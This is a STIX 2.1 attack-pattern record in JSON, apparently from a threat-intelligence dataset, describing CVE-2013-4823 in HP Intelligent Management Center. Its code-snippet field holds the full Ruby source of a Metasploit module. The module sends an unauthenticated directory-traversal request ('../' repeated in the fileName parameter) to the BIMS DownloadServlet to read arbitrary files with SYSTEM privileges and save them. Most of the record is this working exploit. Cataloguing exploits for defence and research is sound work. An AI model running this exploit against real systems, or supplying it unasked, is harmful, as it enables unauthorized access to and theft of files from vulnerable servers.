{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1bb3d59d-2117-41ba-b11f-cef4edd93d69",
    "created": "2024-08-14T16:29:46.642256Z",
    "modified": "2024-08-14T16:29:46.64226Z",
    "name": "HP Intelligent Management BIMS DownloadServlet Directory Traversal",
    "description": " This module exploits a lack of authentication and a directory traversal in HP Intelligent Management, specifically in the DownloadServlet from the BIMS component in order to retrieve arbitrary files with SYSTEM privileges. This module has been tested successfully on HP Intelligent Management Center 5.1 E0202 with BIMS 5.1 E0201 over Windows 2003 SP2.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/hp_imc_bims_downloadservlet_traversal.rb",
            "external_id": "hp_imc_bims_downloadservlet_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4823"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP Intelligent Management BIMS DownloadServlet Directory Traversal',\n      'Description'    => %q{\n          This module exploits a lack of authentication and a directory traversal in HP\n        Intelligent Management, specifically in the DownloadServlet from the BIMS component,\n        in order to retrieve arbitrary files with SYSTEM privileges. This module has been\n        tested successfully on HP Intelligent Management Center 5.1 E0202 with BIMS 5.1 E0201\n        over Windows 2003 SP2.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-4823' ],\n          [ 'OSVDB', '98248' ],\n          [ 'BID', '62897' ],\n          [ 'ZDI', '13-239' ]\n        ]\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'Path to HP Intelligent Management Center', '/imc']),\n        OptString.new('FILEPATH', [true, 'The name of the file to download', '/windows\\\\win.ini']),\n        # By default files downloaded from C:\\Program Files\\iMC\\client\\web\\apps\\imc\\\n        OptInt.new('DEPTH', [true, 'Traversal depth', 6])\n      ])\n  end\n\n  def is_imc?\n    res = send_request_cgi({\n      'uri'      => normalize_uri(target_uri.path.to_s, \"login.jsf\"),\n      'method'   => 'GET'\n    })\n\n    if res and res.code == 200 and res.body =~ /HP Intelligent Management Center/\n      return true\n    else\n      return false\n    end\n  end\n\n  def my_basename(filename)\n    return ::File.basename(filename.gsub(/\\\\/, \"/\"))\n  end\n\n  def run_host(ip)\n\n    if not is_imc?\n      vprint_error(\"#{rhost}:#{rport} - This isn't a HP Intelligent Management Center\")\n      return\n    end\n\n    travs = \"\"\n    travs << \"../\" * datastore['DEPTH']\n    travs << datastore['FILEPATH']\n\n    vprint_status(\"#{rhost}:#{rport} - Sending request...\")\n    res = send_request_cgi({\n      'uri'          => normalize_uri(target_uri.path.to_s, \"bimsDownload\"),\n      'method'       => 'GET',\n      'vars_get'     =>\n        {\n          'fileName' => travs,\n          'path'     => \"/\"\n        }\n    })\n\n    if res and res.code == 200 and res.headers['Content-Type'] and res.headers['Content-Type'] == \"application/doc\"\n      contents = res.body\n      fname = my_basename(datastore['FILEPATH'])\n      path = store_loot(\n        'hp.imc.bimsdownloadservlet',\n        'application/octet-stream',\n        ip,\n        contents,\n        fname\n      )\n      print_good(\"#{rhost}:#{rport} - File saved in: #{path}\")\n    else\n      vprint_error(\"#{rhost}:#{rport} - Failed to retrieve file\")\n      return\n    end\n  end\nend\n"
}